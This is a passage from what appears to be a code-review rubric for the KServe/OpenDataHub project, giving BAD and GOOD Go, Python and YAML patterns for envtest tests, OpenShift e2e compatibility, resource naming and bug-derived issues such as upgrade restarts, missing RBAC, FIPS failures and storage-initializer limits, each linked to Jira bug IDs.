> that nobody reads is not useful to catch regressions."

### Don't Skip Critical Checks (TST-050)

```python
# BAD: skip if prerequisite missing
if not is_rhcl_installed():
    pytest.skip("RHCL not installed")

# QUESTION: is RHCL expected to be installed before the test suite?
# If yes, skipping hides failures.
```

> "We expect RHCL to be installed before our test suite, so this should never happen. It might skip critical tests and
> we won't notice until someone reports it."

### envtest Is Not a Cluster (TST-060)

**Trigger:** a diff adds or changes a test using `envtest`.

```go
// BAD: envtest has no garbage collector, so the child is never collected.
// This Eventually burns the full timeout and then fails.
Expect(k8sClient.Delete(ctx, isvc)).To(Succeed())
Eventually(func() bool {
    err := k8sClient.Get(ctx, deployKey, &appsv1.Deployment{})
    return apierrors.IsNotFound(err)
}, timeout).Should(BeTrue())

// BAD: no kubelet, so availableReplicas stays zero and the ISVC never goes Ready
Eventually(func() bool { return isvc.Status.IsReady() }, timeout).Should(BeTrue())

// GOOD: simulate the controller envtest does not run, and say so
// envtest has no kubelet — fake the Deployment status the reconciler reads.
deploy.Status.AvailableReplicas = 1
deploy.Status.ReadyReplicas = 1
Expect(k8sClient.Status().Update(ctx, deploy)).To(Succeed())
Eventually(func() bool { return isvc.Status.IsReady() }, timeout).Should(BeTrue())
```

```go
// BAD: cluster-scoped, fixed name, no cleanup — leaks into every later test
cr := &rbacv1.ClusterRole{ObjectMeta: metav1.ObjectMeta{Name: "kserve-test-role"}}
Expect(k8sClient.Create(ctx, cr)).To(Succeed())

// GOOD: unique name plus deferred deletion
cr := &rbacv1.ClusterRole{ObjectMeta: metav1.ObjectMeta{Name: "kserve-test-role-" + rand.String(5)}}
Expect(k8sClient.Create(ctx, cr)).To(Succeed())
DeferCleanup(func() { Expect(k8sClient.Delete(ctx, cr)).To(Succeed()) })

// BAD: racing the reconciler
isvc.Spec.Predictor.MinReplicas = ptr.To(int32(2))
Expect(k8sClient.Update(ctx, isvc)).To(Succeed())   // flakes with a conflict

// GOOD
Expect(retry.RetryOnConflict(retry.DefaultRetry, func() error {
    if err := k8sClient.Get(ctx, key, isvc); err != nil { return err }
    isvc.Spec.Predictor.MinReplicas = ptr.To(int32(2))
    return k8sClient.Update(ctx, isvc)
})).To(Succeed())
```

**Applicability boundary:** envtest only. A real-cluster e2e test does have a GC, a scheduler, and a kubelet, so
asserting cascade deletion or readiness there is correct. A namespaced object in a test-unique namespace that the suite
tears down does not need its own `DeferCleanup`.

**Why:** envtest runs `kube-apiserver` and `etcd` and nothing else. Assertions about behavior supplied by the
controller manager, scheduler, or kubelet are asserting something that cannot happen, and the failure shows up as a
timeout rather than as a clear error.

### OpenShift Compatibility in Python e2e Tests (TST-070)

**Trigger:** a diff touches `test/e2e/**/*.py`.

```python
# BAD: restricted-v2 SCC rejects an explicit UID outside the namespace's assigned range
SECURITY_CONTEXT = {"runAsNonRoot": True, "runAsUser": 65532, "runAsGroup": 65532}

# GOOD: the shared fixture is gated behind RUN_AS_NON_ROOT, which OpenShift CI sets
from .fixtures import LLMD_SIMULATOR_SECURITY_CONTEXT
```

```python
# BAD: a command override bypasses the entrypoint wrapper that adds the TLS flags.
# With enableLLMInferenceServiceTLS the HTTPS probe on :8000 never succeeds and the
# ISVC hangs in MinimumReplicasUnavailable until the 600s timeout.
args=["--port", "8000"]

# GOOD: render the TLS flags conditionally — the controller expands these via ReplaceVariables
args=[
    "--port", "8000",
    "{{ if .GlobalConfig.EnableTLS }}--ssl-certfile{{- end }}",
    "{{ if .GlobalConfig.EnableTLS }}/var/run/kserve/tls/tls.crt{{- end }}",
    "{{ if .GlobalConfig.EnableTLS }}--ssl-keyfile{{- end }}",
    "{{ if .GlobalConfig.EnableTLS }}/var/run/kserve/tls/tls.key{{- end }}",
]
```

```python
# BAD: the AuthPolicy SAR check derives the namespace from the request path,
# so a binding in KSERVE_TEST_NAMESPACE never matches an ISVC in e2e-test-llm-auth-*
create_service_account_with_inference_access(sa_name)

# GOOD
create_service_account_with_inference_access(sa_name, namespace=test_case.namespace)
```

**Applicability boundary:** Python files under `test/e2e/`. The TLS clause applies only to workloads with a `command`
override — the default entrypoint handles TLS itself. On the midstream repo `.rules/e2e-openshift-compat.md` is
authoritative and may have been updated since this rubric.

**Why:** all three fail only on OpenShift, and all three fail as a silent 600-second timeout rather than an error, so
they cost a full CI cycle plus a debugging session each time.

## Cross-Repo Coordination

### Image Injection (XREPO-010, CFG-020)

```
# When adding new images to params.env:
# 1. Add to config/overlays/odh/params.env
# 2. Open companion PR in opendatahub-operator to inject:
#    internal/controller/components/kserve/kserve_support.go
# 3. Update kustomization to inject for llmisvcconfig that use it
```

> "We will need to open a PR in the operator to inject/update these images."

### Module Integration (XREPO-020)

> "We need to integrate the overlay(s) with the operator module to have it apply the resources since currently they
> wouldn't be applied."

## Naming

### Resource Prefix (NAM-010)

```yaml
# BAD: generic name in shared namespace
name: llm-vllm-engine

# GOOD: prefixed, specific
name: kserve-llm-isvc-vllm-engine
```

> "I'd prefix it with `kserve-` so that we don't ever clash with other resources in the odh namespace and perhaps more
> specific `llm` -> `llm-isvc`."

## Bug-Derived Patterns

Patterns extracted from 342 real Jira bugs (93 Blocker, 63 Critical, 75 Major, 65 Normal).

### Upgrade Restart Risk (BUG-010)

```yaml
# BAD: annotation injected into pod template causes hash change on upgrade
metadata:
  annotations:
    serving.kserve.io/deployment-mode: "RawDeployment"  # this flows into pod template

# GOOD: annotations that affect pod template must be stable across versions
# Ask: "Does this change the pod template hash for existing Deployments?"
```

Real bugs:

- RHOAIENG-59339: router-scheduler pods unnecessarily redeploy during upgrade due to annotation injection changing pod
  template hash
- RHOAIENG-71245: pods redeployed during upgrade due to modelcar shell quoting change in entrypoint

### Wrong Image Tag (BUG-020)

```yaml
# BAD: placeholder image without kustomize replacement
image: controller:latest

# BAD: version mismatch — GA configs referencing EA images
image: quay.io/opendatahub/vllm:odh-v3.4.0  # but this is a 3.5 release

# GOOD: image in params.env + kustomize replacement + operator injection
# params.env:
kserve-llm-d-routing-sidecar=quay.io/opendatahub/llm-d-routing-sidecar:odh-v3.5-GA
```

Real bugs:

- RHOAIENG-69531: image tag odh-v3.5-EA2 does not exist — all tests fail with ImagePullBackOff
- RHOAIENG-55878: missing kustomize replacement leaves placeholder image `controller:latest`

### Security Context Breaks Device Injection (BUG-030)

```yaml
# BAD: readOnlyRootFilesystem breaks CDI GPU injection
securityContext:
  readOnlyRootFilesystem: true  # nvidia-cdi-hook needs to write to /

# BAD: runAsNonRoot in contexts that need procfs access
securityContext:
  runAsNonRoot: true  # breaks OCI modelcar procfs symlink on xKS

# GOOD: validate security context against ALL deployment targets
# Check: CDI GPU injection, OCI modelcar, xKS, FIPS
```

Real bugs:

- RHOAIENG-75488: readOnlyRootFilesystem: true breaks CDI-based GPU injection (BLOCKER)
- RHOAIENG-71150: readOnlyRootFilesystem must be disabled for nvidia-cdi-hook (BLOCKER)
- INFERENG-7332: runAsNonRoot blocks procfs symlink for OCI modelcar

### Missing Migration Logic (BUG-040)

```go
// BAD: version bump without migration
// Controller crashes on startup because old resources don't match new schema

// GOOD: migration with version detection and fallback
func (r *Reconciler) Reconcile(ctx context.Context, ...) {
    if needsMigration(existing) {
        if err := r.migrate(ctx, existing); err != nil {
            return err
        }
    }
    // normal reconciliation
}
```

Real bugs:

- RHOAIENG-58364: CrashLoopBackOff after upgrade 3.3→3.4 — missing migration logic
- RHOAIENG-54344: Deadlock during migration due to missing conversion webhook
- RHOAIENG-76305: tolerations/nodeSelector not injected after webhook migration

### Missing RBAC (BUG-050)

```yaml
# BAD: controller watches InferenceModelRewrites but no RBAC rule
# Results in: "cannot watch resource inferencemodelrewrites"

# GOOD: every watched resource needs RBAC
rules:
- apiGroups: ["inference.networking.k8s.io"]
  resources: ["inferencemodelrewrites"]
  verbs: ["get", "list", "watch"]
```

Real bugs:

- RHOAIENG-56779: EPP fails to watch inferencemodelrewrites — missing RBAC in distro ClusterRole
- RHOAIENG-54987: missing RBAC for clusterstoragecontainers blocks KServe reconciliation

### FIPS/TLS Compatibility (BUG-060)

```go
// BAD: binary uses non-FIPS-compliant crypto or CPU-specific instructions
// Crashes with FATAL FIPS SELFTEST FAILURE or SIGILL on specific CPUs

// BAD: flag mismatch between versions
// "flag provided but not defined: -enable-cert-reload"

// GOOD: verify binary on FIPS-enabled cluster and multiple CPU architectures
// GOOD: check flag compatibility between old and new versions
```

Real bugs:

- RHOAIENG-58354: tokenizer crashes with FATAL FIPS SELFTEST FAILURE
- INFERENG-6224: sidecar crashes with SIGILL on AKS nodes (AMD EPYC, Intel Cascade Lake)
- RHOAIENG-56379: router-scheduler fails with undefined flag `-enable-cert-reload`

### Monitoring Breakage (BUG-070)

```yaml
# BAD: hardcoded matchNamespace
spec:
  namespaceSelector:
    matchNames: ["redhat-ods-applications"]  # breaks in non-default namespace

# BAD: metrics port without NetworkPolicy rule
# Prometheus can't scrape because port 9090 is blocked

# GOOD: derive namespace from deployment context
# GOOD: add NetworkPolicy port for every metrics endpoint
```

Real bugs:

- INFERENG-5614: WVA servicemonitor matchNamespace field is hardcoded
- RHOAIENG-58209: metrics port 9090 blocked by NetworkPolicy
- INFERENG-7687: must patch networkpolicy for Prometheus to scrape WVA metrics

### Hardcoded Values (BUG-080)

```yaml
# BAD: hardcoded timeout breaks for large models
startupProbe:
  failureThreshold: 60
  periodSeconds: 10  # = 10 min max — too short for 70B+ models

# BAD: hardcoded secret value across all pods
env:
- name: OAUTH2_PROXY_COOKIE_SECRET
  value: "static-secret-here"  # same in every pod = security risk

# GOOD: make timeout configurable or derive from model size
# GOOD: generate unique secrets per deployment
```

Real bugs:

- RHOAIENG-75793: hardcoded 10-minute startupProbe causes termination during large model loads
- RHOAIENG-69776: hardcoded oauth-proxy cookie-secret in every runtime pod

### Multi-Node Edge Cases (BUG-110)

```python
# BAD: entrypoint only considers first NIC
NCCL_SOCKET_IFNAME=$(ip -o link show | head -1 | awk '{print $2}')

# BAD: metrics counted per pod in LWS — over-counts with multiple replicas
# Each LWS replica may have multiple metric-emitting pods

# GOOD: enumerate all NICs/HCAs, select by network type
# GOOD: use per-replica deduplication for metrics
```

Real bugs:

- INFERENG-6968: P/D entrypoint script only considers first NIC/HCA
- INFERENG-8439: LWS replicas with multiple metric-emitting pods are over-counted
- RHOAIENG-70416: Multi-node Ready condition stuck at Unknown despite all pods running

### Storage Initializer / Modelcar Injection (BUG-120)

```go
// BAD: init container argument list grows unbounded with model count
// With 100+ models, the argument list exceeds execve limits → deployment fails
args := []string{modelUri1, modelUri2, ..., modelUri150}  // "argument list too long"

// GOOD: use manifest file or ConfigMap for large model lists
// Write model URIs to a file, pass file path as single argument
```

```go
// BAD: mutating webhook strips storageUri when imagePullSecrets secret is deleted
// The webhook fires on Secret deletion and clears the storageUri annotation
func (w *Webhook) Handle(ctx context.Context, req admission.Request) {
    // Missing: guard against stale imagePullSecrets reference
}

// GOOD: guard storageUri mutation — only clear on explicit user action, not cascading deletes
```

```go
// BAD: hf:// URI downloads entire repo (ONNX, TF, Flax exports) when only safetensors needed
// BAD: HF_TOKEN env var not propagated from InferenceService to storage-initializer init container
// BAD: versioned model path (hf://org/model@v1.2) not resolved — downloads HEAD instead

// GOOD: filter downloads by required framework files
// GOOD: propagate all credential env vars to init containers
// GOOD: resolve version refs before download
```

```yaml
# BAD: storage-initializer binary without FIPS compliance
# Crashes with: FIPS check-payload failure on FIPS-enabled clusters

# BAD: storage-initializer not built for ppc64le/s390x
# Build failure on Power and Z architectures

# GOOD: verify storage-initializer binary on FIPS cluster AND multi-arch
```

For pod template hash stability of modelcar command strings, see CTL-100.

Real bugs:

- RHOAIENG-30376: storage-initializer argument list too long — single models fail to deploy (Blocker)
- RHOAIENG-60931: FIPS check-payload failure in storage-initializer binary (Blocker)
- RHOAIENG-50492: storage-initializer build failure on Power/Z (Blocker)
- RHOAIENG-69344: HF_TOKEN not propagated to storage-initializer init container
- RHOAIENG-69346: downloads entire HF repo instead of required files
- RHOAIENG-61105: mutating webhook strips storageUri when imagePullSecrets secret deleted
- RHOAIENG-50800: model deployment fails during storage-initializer download (Critical)
- RHOAIENG-34931: storage initializer can't handle versioned model storage paths
